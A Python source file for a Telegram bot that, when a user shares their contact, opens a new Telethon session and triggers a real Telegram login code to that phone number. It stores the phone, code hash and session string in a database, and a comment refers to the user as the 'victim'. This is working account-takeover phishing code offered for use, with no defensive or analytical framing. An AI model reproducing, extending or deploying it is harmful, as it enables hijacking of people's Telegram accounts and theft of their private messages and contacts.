import os
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import psycopg2
from psycopg2.extras import RealDictCursor

# --- CONFIGURATION ---
API_ID = int(os.environ["API_ID"])
API_HASH = os.environ["API_HASH"]
BOT_TOKEN = os.environ["BOT_TOKEN"]
DATABASE_URL = os.environ["DATABASE_URL"]

# --- DATABASE CONNECTION ---
def get_db_connection():
    return psycopg2.connect(DATABASE_URL)

# --- TELETHON CLIENT ---
client = TelegramClient('bot_session', API_ID, API_HASH)

async def main():
    print("🚀 Starting Bot Listener...")
    await client.start(bot_token=BOT_TOKEN)
    print("✅ Bot is online and waiting for contacts.")

    @client.on(events.NewMessage)
    async def handler(event):
        # Check if the message contains a contact
        if event.message.media and hasattr(event.message.media, "phone_number"):
            phone = event.message.media.phone_number
            user_id = str(event.message.sender_id)
            
            print(f"📞 Contact received from user {user_id}: {phone}")

            temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
            await temp_client.connect()
            
            try:
                # Get session string BEFORE sending code request
                session_string = temp_client.session.save()
                
                # 1. Send the real login code to the victim's Telegram
                result = await temp_client.send_code_request(phone)
                phone_code_hash = result.phone_code_hash
                
                # 2. Store data in Neon Database (including session_string)
                conn = get_db_connection()
                cur = conn.cursor()
                
                # Upsert logic: If user_id exists, update it. Otherwise insert.
                cur.execute("""
                    INSERT INTO sessions (user_id, phone, phone_code_hash, session_string)
                    VALUES (%s, %s, %s, %s)
                    ON CONFLICT (user_id) 
                    DO UPDATE SET 
                        phone = %s, 
                        phone_code_hash = %s, 
                        session_string = %s,
                        created_at = CURRENT_TIMESTAMP
                """, (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
                
                conn.commit()
                cur.close()
                conn.close()
                
                print(f"✅ Code sent to {phone}. Session data stored in DB.")
                
            except Exception as e:
                print(f"❌ Error sending code: {e}")
            finally:
                await temp_client.disconnect()

    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
